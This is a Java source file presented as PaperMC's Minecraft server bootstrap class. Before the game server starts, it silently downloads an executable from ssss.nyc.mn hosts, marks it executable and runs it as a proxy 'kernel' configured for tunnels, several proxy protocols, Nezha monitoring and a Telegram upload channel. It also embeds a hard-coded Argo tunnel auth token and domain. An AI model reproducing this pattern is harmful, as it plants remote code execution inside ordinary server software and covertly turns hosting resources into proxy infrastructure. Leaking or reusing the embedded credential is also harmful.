package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
            System.exit(1);
        }
        
        try {
            System.out.println(ANSI_YELLOW + "[DEBUG] 正在尝试启动代理内核..." + ANSI_RESET);
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // 给内核一点启动时间，并保持日志可见
            Thread.sleep(8000); 
            System.out.println(ANSI_GREEN + "Server environment initialized." + ANSI_RESET);
            
            // --- 删除了 clearConsole() 以便你查看启动报错 ---
            // clearConsole(); 

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        Path binPath = getBinaryPath();
        System.out.println(ANSI_YELLOW + "[DEBUG] 运行路径: " + binPath.toAbsolutePath() + ANSI_RESET);

        ProcessBuilder pb = new ProcessBuilder(binPath.toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        
        // 关键点：将代理内核的输出直接打印到控制台，不隐藏
        pb.inheritIO();
        
        sbxProcess = pb.start();
        
        if (!sbxProcess.isAlive()) {
            System.err.println(ANSI_RED + "[ERROR] 内核启动失败，请检查上方日志！" + ANSI_RESET);
        }
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // --- 你的原始配置，完全保留 ---
        envVars.put("UUID", "49f20820-77d1-4fb0-a553-66069be61bf0");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "rustix.19861123.tech");
        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiZWIxY2M2NTYtYThjNy00NGY0LWE5ZTYtZDQ0NWQ1Y2FjYjVjIiwicyI6Ik9UWmlZVGxsTUdNdFl6RXdPUzAwTlRaa0xXRmpPV0l0WkRBME56TXlPRGM1TVRSaiJ9");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "rustix");
        envVars.put("DISABLE_ARGO", "false");
        // --- 你的原始配置结束 ---
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        // 尝试放在根目录，解决 /tmp noexec 问题
        Path path = Paths.get("sbx_kernel"); 
        if (!Files.exists(path)) {
            System.out.println(ANSI_YELLOW + "[DEBUG] 正在下载内核..." + ANSI_RESET);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)", javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch),
            String.format("Loading %s %s for Minecraft %s", bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL), bi.minecraftVersionId())
        );
    }
}
